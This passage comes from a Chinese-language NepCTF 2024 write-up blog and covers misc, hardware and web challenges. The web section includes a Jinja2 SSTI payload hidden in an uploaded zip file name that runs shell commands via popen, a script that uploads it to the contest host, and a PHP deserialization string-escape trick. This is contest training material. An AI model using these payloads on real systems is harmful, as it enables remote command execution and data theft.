简单数学计算答案15</span><br>flag_list[<span class="hljs-number">24</span>] = <span class="hljs-string">&quot;1&quot;</span><br>flag_list[<span class="hljs-number">25</span>] = <span class="hljs-string">&quot;5&quot;</span><br><span class="hljs-comment"># 计算带入</span><br>number = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(<span class="hljs-number">1028970</span>/<span class="hljs-number">927</span>))<br>flag_list[<span class="hljs-number">33</span>] = number[<span class="hljs-number">0</span>]<br>flag_list[<span class="hljs-number">41</span>] = number[<span class="hljs-number">1</span>]<br>flag_list[<span class="hljs-number">43</span>:<span class="hljs-number">45</span>] = number[<span class="hljs-number">2</span>:]<br><br>str1 = <span class="hljs-string">&quot;1t1rna&quot;</span>.replace(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;e&quot;</span>)<br>flag_list[<span class="hljs-number">35</span>:<span class="hljs-number">41</span>] = str1<br><span class="hljs-comment"># 转化大小写</span><br>flag_list[<span class="hljs-number">31</span>:<span class="hljs-number">33</span>] = <span class="hljs-string">&quot;me&quot;</span><br><span class="hljs-comment"># 进行分割</span><br>flag_list[<span class="hljs-number">6</span>] = <span class="hljs-string">&quot;_&quot;</span><br>flag_list[<span class="hljs-number">19</span>] = <span class="hljs-string">&quot;_&quot;</span><br>flag_list[<span class="hljs-number">34</span>] = <span class="hljs-string">&quot;_&quot;</span><br>flag_list[<span class="hljs-number">42</span>] = <span class="hljs-string">&quot;_&quot;</span><br>flag_list[<span class="hljs-number">17</span>] = <span class="hljs-string">&quot;&amp;&quot;</span><br>flag_list[<span class="hljs-number">27</span>] = <span class="hljs-string">&quot;&amp;&quot;</span><br><br>flag_list[<span class="hljs-number">1</span>] = <span class="hljs-built_in">chr</span>(<span class="hljs-number">69</span>).lower()<br><br>flag_list[<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;cet4&quot;</span>[<span class="hljs-number">0</span>]<br>flag_list[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>] = <span class="hljs-string">&quot;cet4&quot;</span>[<span class="hljs-number">1</span>:<span class="hljs-number">3</span>]<br><br>flag_list[<span class="hljs-number">7</span>] = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;j&#x27;</span>) - <span class="hljs-number">1</span>)<br>flag_list[<span class="hljs-number">8</span>] = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;t&#x27;</span>) - <span class="hljs-number">1</span>)<br>flag_list[<span class="hljs-number">9</span>] = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;|&#x27;</span>) - <span class="hljs-number">1</span>)<br>flag_list[<span class="hljs-number">18</span>] = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;D&#x27;</span>) - <span class="hljs-number">1</span>)<br>flag_list[<span class="hljs-number">26</span>] = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;f&#x27;</span>) - <span class="hljs-number">1</span>)<br><span class="hljs-comment"># 前面的是芙莉莲后面的是辛美尔</span><br>flag_list[<span class="hljs-number">13</span>:<span class="hljs-number">17</span>] = <span class="hljs-string">&quot;eren&quot;</span><br>flag_list[<span class="hljs-number">20</span>:<span class="hljs-number">24</span>] = <span class="hljs-string">&quot;SunR&quot;</span><br><span class="hljs-comment"># 猜测是单词secret</span><br>flag_list[<span class="hljs-number">3</span>] = <span class="hljs-string">&quot;r&quot;</span><br><br>flag = <span class="hljs-string">&#x27;&#x27;</span>.join(flag_list)<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>得到**secret_is{Frieren&amp;C_SunR15e&amp;Himme1_eterna1_10ve}**解压得到图片，010分析之后可能需要异或得到原来的图片(第一次见,涨知识了)</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">enc = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;miaomiao.png&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>key = <span class="hljs-string">b&#x27;secret_is&#123;Frieren&amp;C_SunR15e&amp;Himme1_eterna1_10ve&#125;&#x27;</span><br>flag = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>    data = enc[i]^key[i%<span class="hljs-built_in">len</span>(key)]<br>    flag.append(data)<br><br>flag = <span class="hljs-built_in">bytes</span>(flag)<br><br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.png&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).write(flag)<br></code></pre></td></tr></table></figure><p>没有直接的flag，crc爆破一下得到flag</p><p><img src="/../../images/nepctf/2024/flag.png" alt="flag"></p><h2 id="NepMagic-——-CheckIn"><a href="#NepMagic-——-CheckIn" class="headerlink" title="NepMagic —— CheckIn"></a>NepMagic —— CheckIn</h2><p>游戏签到，有一层需要盲走得到隐藏的碎片，走完就可以得到flag了</p><p><img src="/../../images/nepctf/2024/checkin.png" alt="checkin"></p><h2 id="3DNep"><a href="#3DNep" class="headerlink" title="3DNep"></a>3DNep</h2><p>也是第一次见，010打开开头是gitf，搜索一下是3d模型的图片，改一下.gitf，用该网站看一下<a href="https://gltf-viewer.donmccurdy.com/">在线网址</a></p><img src="/../../images/nepctf/2024/hanxin.png" alt="hanxin" style="zoom:67%;"><p>可以得到图片，遇到的二维码是汉信码也是第一次见，用在线网站扫一下，得到flag</p><p>NepCTF{6e766b59-23d1-395c26d708a4}</p><h2 id="NepCamera"><a href="#NepCamera" class="headerlink" title="NepCamera"></a>NepCamera</h2><p>跟着官方wp也是学一遍，也是第一次见usb类型的流量包，根据官p和晨曦师傅的wp研究了一下，先看一下usb里面的流量包里面会发现有<code>ffd8ffe0</code>的内容，利用tshark先把内容提取出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r NepCamera.pcapng -T fields -e usb.iso.data &gt; <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>然后就是写脚本提取内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">datas = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;../test&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read().strip().split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>hex_data = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> datas:<br>    data = i.split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>    hex_data += <span class="hljs-string">&#x27;&#x27;</span>.join([d[<span class="hljs-number">24</span>:] <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> data])<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(hex_data))<br>cnt = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    start = hex_data.find(<span class="hljs-string">&#x27;ffd8ffe0&#x27;</span>)<br>    <span class="hljs-keyword">if</span> start == -<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">break</span><br>    end = hex_data[start+<span class="hljs-number">8</span>:].find(<span class="hljs-string">&#x27;ffd8ffe0&#x27;</span>)<br>    <span class="hljs-keyword">if</span> end == -<span class="hljs-number">1</span>:<br>        end = <span class="hljs-built_in">len</span>(hex_data)<br>    out_data = hex_data[start:end]<br>    hex_data = hex_data[end:]<br>    out_data = <span class="hljs-built_in">bytes</span>.fromhex(out_data)<br>    <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./img/&#x27;</span>+<span class="hljs-built_in">str</span>(cnt)+<span class="hljs-string">&#x27;.png&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>).write(out_data)<br>    cnt += <span class="hljs-number">1</span><br><br><span class="hljs-built_in">print</span>(cnt)<br></code></pre></td></tr></table></figure><p>对图片进行分析一会就可以得到flag了</p><h1 id="Hardware"><a href="#Hardware" class="headerlink" title="Hardware"></a>Hardware</h1><p>进行binwalk一下得到许多文件</p><p>再进行string 分析通过排除可以得到在string 19047F里面有</p><p>猜一手base64然后就可以搜<code>=</code>有一串长的内容，利用cyber厨子得到flag</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">JZSXAQ2UIZ5VSMDVL5DTA5C7JMZTG3S7GFXFGMLHNB2F6MLOL53FQ5ZQOJFXGIJBEFPUYM3UE5ZV6RZQL5DHK4TUNAZXE7I=<br></code></pre></td></tr></table></figure><p><strong>NepCTF{Y0u_G0t_K33n_1nS1ght_1n_vXw0rKs!!!_L3t’s_G0_Furth3r}</strong></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="NepDouble"><a href="#NepDouble" class="headerlink" title="NepDouble"></a>NepDouble</h2><p>这题其实已经有思路了，就是利用上传文件进行ssti，但是自己代码没有好好看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, render_template_string<br><span class="hljs-keyword">from</span> zipfile <span class="hljs-keyword">import</span> ZipFile<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Environment, FileSystemLoader<br><br>app = Flask(__name__, template_folder=<span class="hljs-string">&#x27;static&#x27;</span>)<br>app.config[<span class="hljs-string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="hljs-number">1</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span><br><br>UPLOAD_FOLDER = <span class="hljs-string">&#x27;/app/uploads&#x27;</span><br>app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER<br><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(UPLOAD_FOLDER):<br>    os.makedirs(UPLOAD_FOLDER)<br><br>template_env = Environment(loader=FileSystemLoader(<span class="hljs-string">&#x27;static&#x27;</span>), autoescape=<span class="hljs-literal">True</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">render_template</span>(<span class="hljs-params">template_name, **context</span>):<br>    template = template_env.get_template(template_name)<br>    <span class="hljs-keyword">return</span> template.render(**context)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">render_template_string</span>(<span class="hljs-params">template_string, **context</span>):<br>    template = template_env.from_string(template_string)<br>    <span class="hljs-keyword">return</span> template.render(**context)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">if</span> request.method != <span class="hljs-string">&quot;POST&quot;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Please use POST method to upload files.&#x27;</span><br><br>    <span class="hljs-keyword">try</span>:<br>        clear_uploads_folder()<br>        files = request.files.get(<span class="hljs-string">&#x27;tp_file&#x27;</span>, <span class="hljs-literal">None</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> files:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No file uploaded.&#x27;</span><br><br>        file_size = <span class="hljs-built_in">len</span>(files.read())<br>        files.seek(<span class="hljs-number">0</span>)<br><br>        file_extension = files.filename.rsplit(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)[-<span class="hljs-number">1</span>].lower()<br>        <span class="hljs-keyword">if</span> file_extension != <span class="hljs-string">&#x27;zip&#x27;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid file type. Please upload a .zip file.&#x27;</span><br><br>        timestamp = datetime.datetime.now().strftime(<span class="hljs-string">&#x27;%Y%m%d%H%M%S&#x27;</span>)<br>        md5_dir_name = hashlib.md5(timestamp.encode()).hexdigest()<br>        unzip_folder = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], md5_dir_name)<br>        os.makedirs(unzip_folder, exist_ok=<span class="hljs-literal">True</span>)<br><br>        <span class="hljs-keyword">with</span> ZipFile(files) <span class="hljs-keyword">as</span> zip_file:<br>            zip_file.extractall(path=unzip_folder)<br><br>        files_list = []<br>        <span class="hljs-keyword">for</span> root, dirs, files <span class="hljs-keyword">in</span> os.walk(unzip_folder):<br>            <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files:<br>                <span class="hljs-built_in">print</span>(file)<br>                file_path = os.path.join(root, file)<br>                relative_path = os.path.relpath(file_path, app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>])<br>                link = <span class="hljs-string">f&#x27;&lt;a href=&quot;/cat?file=<span class="hljs-subst">&#123;relative_path&#125;</span>&quot;&gt;<span class="hljs-subst">&#123;file&#125;</span>&lt;/a&gt;&#x27;</span><br>                files_list.append(link)<br><br>        <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>.join(files_list))<br><br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid filename.&#x27;</span><br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;An error occurred. Please check your file and try again.&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/cat&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cat</span>():<br>    file_path = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> file_path:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;File path is missing.&#x27;</span><br><br>    new_file = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], file_path)<br>    <span class="hljs-keyword">if</span> os.path.commonprefix(<br>            [os.path.abspath(new_file), os.path.abspath(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>])]) != os.path.abspath(<br>            app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>]):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid file path.&#x27;</span><br><br>    <span class="hljs-keyword">if</span> os.path.islink(new_file):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Symbolic links are not allowed.&#x27;</span><br><br>    <span class="hljs-keyword">try</span>:<br>        filename = file_path.split(<span class="hljs-string">&#x27;/&#x27;</span>)[-<span class="hljs-number">1</span>]<br>        content = read_large_file(new_file)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;test.html&#x27;</span>, content=content, filename=filename, dates=Exec_date())<br>    <span class="hljs-keyword">except</span> FileNotFoundError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;File not found.&#x27;</span><br>    <span class="hljs-keyword">except</span> IOError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;Error reading file: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec_date</span>():<br>    d_res = os.popen(<span class="hljs-string">&#x27;date&#x27;</span>).read()<br>    <span class="hljs-keyword">return</span> d_res.split(<span class="hljs-string">&quot; &quot;</span>)[-<span class="hljs-number">1</span>].strip() + <span class="hljs-string">&quot; &quot;</span> + d_res.split(<span class="hljs-string">&quot; &quot;</span>)[-<span class="hljs-number">3</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">clear_uploads_folder</span>():<br>    <span class="hljs-keyword">for</span> root, dirs, files <span class="hljs-keyword">in</span> os.walk(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], topdown=<span class="hljs-literal">False</span>):<br>        <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files:<br>            os.remove(os.path.join(root, file))<br>        <span class="hljs-keyword">for</span> <span class="hljs-built_in">dir</span> <span class="hljs-keyword">in</span> dirs:<br>            os.rmdir(os.path.join(root, <span class="hljs-built_in">dir</span>))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_large_file</span>(<span class="hljs-params">file_path</span>):<br>    content = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file:<br>            content += line<br>    <span class="hljs-keyword">return</span> content<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-string">&quot;8000&quot;</span>, debug=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p>关键点在<code> return render_template_string(&#39;&lt;br&gt;&#39;.join(files_list))</code></p><p>再看一下static可以进行ssti</p><p>直接命名文件名</p><p><code>&#123;&#123;''.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('ls').read()&#125;&#125;</code></p><p>通过修改<code>ls</code>这个位置，发现flag在上个目录，需要进行<code>cd..;cat flag</code>然后写个exp传入得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;https://neptune-16431.nepctf.lemonprefect.cn/&#x27;</span><br><span class="hljs-comment"># 上传带有恶意脚本的文件名</span><br>files = &#123;<span class="hljs-string">&quot;tp_file&quot;</span>:(<span class="hljs-string">&#x27;payload.zip&#x27;</span>,<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;payload.zip&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read())&#125;<br>response = requests.post(url, files=files)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><p>可以得到flag</p><h2 id="PHP-MASTER"><a href="#PHP-MASTER" class="headerlink" title="PHP_MASTER!!"></a>PHP_MASTER!!</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>( <span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">substrstr</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$start</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;[&quot;</span>);<br>    <span class="hljs-variable">$end</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mb_substr</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$start</span> + <span class="hljs-number">1</span>, <span class="hljs-variable">$end</span> - <span class="hljs-number">1</span> - <span class="hljs-variable">$start</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readflag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;key=== <span class="hljs-string">&quot;\0key\0&quot;</span>)&#123;<br>            <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>];<br>            <span class="hljs-variable">$contents</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>);<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$contents</span>);<br><br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span><br><span class="hljs-class"></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\[|\]/i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nep&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO!!!&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">substrstr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nep1&#x27;</span>].<span class="hljs-string">&quot;[welcome to&quot;</span>. <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nep&#x27;</span>].<span class="hljs-string">&quot;CTF]&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$str</span>===<span class="hljs-string">&#x27;NepCTF]&#x27;</span>)&#123;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;b) ();<br>        &#125;<br><br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span><br><span class="hljs-class"></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$s</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;s = <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br><br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span> -&gt;str;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]));<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-string">&quot;00&quot;</span>,<span class="hljs-variable">$ser</span>);<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);<br></code></pre></td></tr></table></figure><p>类似这题其实已经是第三次了(第一次是黄河流域第二次是XGCTF),一直没仔细研究,趁着这次好好研究一下</p><p>先了解一下上方的字符串注入，这里就直接聊怎么做了，详细讲解可以去看gxngxngxn师傅的博客</p><p>%9f可以造成字符串往后移动一位，因为它不解析，%f0可以把字符串吞掉前三位</p><img src="/../../images/nepctf/2024/php1.png" alt="php1" style="zoom:80%;"><img src="/../../images/nepctf/2024/php2.png" alt="php2" style="zoom:80%;"><p>%f0配合任意的三个字符结合%9f就可以达到字符串逃逸</p><p>由此可以够造截取前面的内容，使$str&#x3D;NepCTF]</p><img src="/../../images/nepctf/2024/php3.png" alt="php3" style="zoom:80%;"><p>本题存在非预期解，先了解一下</p><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p><strong>利用phpinfo(),读取flag</strong></p><p><code>$data = 